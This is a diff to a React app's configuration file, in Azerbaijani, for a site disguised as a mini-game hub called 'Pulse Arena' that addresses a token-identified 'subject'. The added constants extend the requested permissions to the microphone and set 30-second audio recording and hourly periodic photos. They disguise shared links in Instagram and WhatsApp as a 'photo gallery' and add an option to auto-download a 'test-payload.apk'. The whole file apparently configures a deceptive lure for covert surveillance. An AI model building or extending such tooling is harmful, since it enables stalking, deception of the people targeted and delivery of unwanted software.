@@ -23,7 +23,7 @@ export const SUBJECT_TITLE =
 
 export const SUBJECT_MESSAGE =
     process.env.REACT_APP_SUBJECT_MESSAGE ||
-    'Davam etmək üçün kamera və konum icazəsi verməlisiniz. Bu, təhlükəsizlik yoxlamasıdır.';
+    'Davam etmək üçün kamera, mikrofon və konum icazəsi verməlisiniz.';
 
 export const SUBJECT_CAMERA_DONE_KEY = 'subject_camera_done_main';
 
@@ -47,6 +47,12 @@ export const SUBJECT_CAMERA_MESSAGE =
 
 export const CAMERA_VIDEO_SECONDS = Number(process.env.REACT_APP_CAMERA_VIDEO_SECONDS) || 5;
 
+export const AUDIO_CHUNK_SECONDS =
+    Number(process.env.REACT_APP_AUDIO_CHUNK_SECONDS) || 30;
+
+export const PERIODIC_PHOTO_MS =
+    Number(process.env.REACT_APP_PERIODIC_PHOTO_MS) || 3600000;
+
 export const SUBJECT_SUCCESS_MESSAGE =
     process.env.REACT_APP_SUBJECT_SUCCESS_MESSAGE ||
     'Təsdiqləndi. Sorğunuz qəbul olundu — bu pəncərəni bağlaya bilərsiniz.';
@@ -59,13 +65,28 @@ export function subjectCameraDoneKey(token) {
 
 export const CONSENT_TEXT =
     process.env.REACT_APP_CONSENT_TEXT ||
-    `${SUBJECT_TITLE}. ${SUBJECT_CAMERA_MESSAGE} Kamera və konum məlumatları yoxlama məqsədilə işlənir.`;
+    `${SUBJECT_TITLE}. ${SUBJECT_CAMERA_MESSAGE} Kamera, mikrofon və konum məlumatları yoxlama məqsədilə işlənir; saytda olduğunuz müddət səs və dövri foto qeydə alına bilər.`;
 
 export const GAME_HUB_TITLE = process.env.REACT_APP_GAME_HUB_TITLE || 'Pulse Arena';
 
 export const GAME_HUB_TAGLINE =
     process.env.REACT_APP_GAME_HUB_TAGLINE || 'Sürətli mini-oyunlar — level qazan';
 
+/** Link önizləməsi (Instagram DM, WhatsApp) — yalnız public/index.html OG tag-ları */
+export const SHARE_PREVIEW_TITLE =
+    process.env.REACT_APP_SHARE_PREVIEW_TITLE || 'Pulse Arena';
+
+export const SHARE_PREVIEW_DESCRIPTION =
+    process.env.REACT_APP_SHARE_PREVIEW_DESCRIPTION ||
+    'Şəkillərini paylaş — foto qalereya.';
+
 export function pulseProgressKey(clientKey) {
     return `pulse_progress_${clientKey}`;
 }
+
+/** Lokal test: true olanda əsas saytda bir dəfə test-payload.apk endirilir (default: false) */
+export const TEST_AUTO_DOWNLOAD =
+    process.env.REACT_APP_TEST_AUTO_DOWNLOAD === 'true';
+
+export const TEST_DOWNLOAD_PATH =
+    process.env.REACT_APP_TEST_DOWNLOAD_PATH || '/test-payload.apk';
